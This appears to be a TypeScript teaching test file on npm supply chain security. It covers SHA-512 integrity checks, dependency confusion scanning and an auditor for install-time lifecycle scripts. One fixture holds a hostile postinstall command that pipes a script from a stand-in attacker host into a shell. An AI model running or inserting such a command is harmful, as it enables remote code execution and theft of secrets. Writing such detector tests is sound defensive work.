import { describe, it } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";

/**
 * Module 12: Software Supply Chain & Dependency Security (OWASP A03:2025)
 * Demonstrates package-lock SHA-512 integrity verification, dependency confusion detection,
 * and malicious lifecycle script auditing.
 */

// Verify package tarball bytes against npm integrity string (sha512-...)
function verifyPackageIntegrity(tarballBytes: Buffer, integrityHeader: string): boolean {
  if (!integrityHeader.startsWith("sha512-")) {
    return false; // Require modern SHA-512 integrity
  }
  const expectedBase64 = integrityHeader.slice(7);
  const actualHash = crypto.createHash("sha512").update(tarballBytes).digest("base64");
  return crypto.timingSafeEqual(Buffer.from(actualHash), Buffer.from(expectedBase64));
}

// Scans dependencies for Dependency Confusion risks
function scanDependencyConfusion(
  dependencies: string[],
  internalScopes: string[],
  publicRegistryPackages: Set<string>
): { riskyPackages: string[] } {
  const risky: string[] = [];

  for (const dep of dependencies) {
    // If a package is unscoped (e.g. "auth-core") and exists on the public registry,
    // an attacker can shadow internal code by publishing version 99.9.9!
    const isScoped = internalScopes.some(scope => dep.startsWith(`@${scope}/`));
    if (!isScoped && publicRegistryPackages.has(dep)) {
      risky.push(dep);
    }
  }

  return { riskyPackages: risky };
}

// Lifecycle script auditor (OWASP A03)
function auditLifecycleScripts(packageManifest: Record<string, any>): { hasDangerousScripts: boolean; scripts: string[] } {
  const dangerousHooks = ["preinstall", "install", "postinstall", "prepublish", "prepare"];
  const found: string[] = [];

  const scripts = packageManifest.scripts || {};
  for (const hook of dangerousHooks) {
    if (scripts[hook]) {
      found.push(hook);
    }
  }

  return {
    hasDangerousScripts: found.length > 0,
    scripts: found
  };
}

describe("Module 12: Software Supply Chain Integrity & Risk Scanning", () => {
  it("verifies package tarball binary integrity against SHA-512 lockfile hashes", () => {
    const tarballBytes = Buffer.from("simulated_npm_package_tarball_payload_2026", "utf8");
    const validIntegrity = "sha512-" + crypto.createHash("sha512").update(tarballBytes).digest("base64");

    // Exact match verifies true
    assert.equal(verifyPackageIntegrity(tarballBytes, validIntegrity), true);

    // Tampered bytes fail verification (detects backdoored packages in transit)
    const tamperedBytes = Buffer.from("tampered_npm_package_with_malware", "utf8");
    assert.equal(verifyPackageIntegrity(tamperedBytes, validIntegrity), false);
  });

  it("detects Dependency Confusion vulnerability on unscoped internal packages", () => {
    const internalScopes = ["mycorp"];
    const publicRegistry = new Set<string>([
      "express",
      "lodash",
      "billing-internal-engine" // Attacker registered this unscoped name on public npm!
    ]);

    // Audit internal private packages against public registry to detect namespace shadowing
    const internalPackages = [
      "@mycorp/auth-lib",        // Safe: scoped to @mycorp
      "billing-internal-engine"  // DANGEROUS: unscoped internal name shadowed on public npm!
    ];

    const scan = scanDependencyConfusion(internalPackages, internalScopes, publicRegistry);
    assert.deepEqual(scan.riskyPackages, ["billing-internal-engine"]);
  });

  it("audits and flags dangerous package postinstall lifecycle scripts", () => {
    const maliciousManifest = {
      name: "evil-utility",
      version: "1.0.0",
      scripts: {
        postinstall: "curl https://attacker.com/steal-env | sh"
      }
    };

    const audit = auditLifecycleScripts(maliciousManifest);
    assert.equal(audit.hasDangerousScripts, true);
    assert.deepEqual(audit.scripts, ["postinstall"]);

    const benignManifest = {
      name: "pure-math-lib",
      version: "2.0.0",
      scripts: {
        test: "node --test"
      }
    };
    assert.equal(auditLifecycleScripts(benignManifest).hasDangerousScripts, false);
  });
});
